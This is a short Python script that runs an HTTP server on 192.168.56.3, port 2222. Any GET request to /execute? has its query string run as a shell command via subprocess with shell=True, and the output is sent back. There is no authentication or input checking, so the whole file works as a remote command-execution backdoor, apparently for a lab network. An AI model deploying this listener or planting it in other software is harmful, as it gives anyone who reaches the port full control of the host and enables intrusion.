from http.server import BaseHTTPRequestHandler, HTTPServer
import subprocess

class MyRequestHandler(BaseHTTPRequestHandler):
    def _send_response(self, content, status=200):
        self.send_response(status)
        self.send_header('Content-type', 'text/plain')
        self.send_header('Content-length', len(content))
        self.end_headers()
        self.wfile.write(content.encode())

    def do_GET(self):
        try:
            if self.path.startswith('/execute?'):
                command = self.path.split('?')[1]
                response = self.execute_command(command)
                self._send_response(response)
            elif self.path == '/exit':
                self._send_response('Exiting...')
                self.server.shutdown()
            else:
                self._send_response('Invalid request', status=400)
        except Exception as e:
            self._send_response('Error: ' + str(e), status=500)

    def execute_command(self, command):
        try:
            result = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT, text=True)
            return result
        except subprocess.CalledProcessError as e:
            return str(e.output)

def start_http_server():
    host_ip = '192.168.56.3'
    host_port = 2222
    server = HTTPServer((host_ip, host_port), MyRequestHandler)
    print(f'Server listening on {host_ip}:{host_port}')
    server.serve_forever()

if __name__ == '__main__':
    start_http_server()
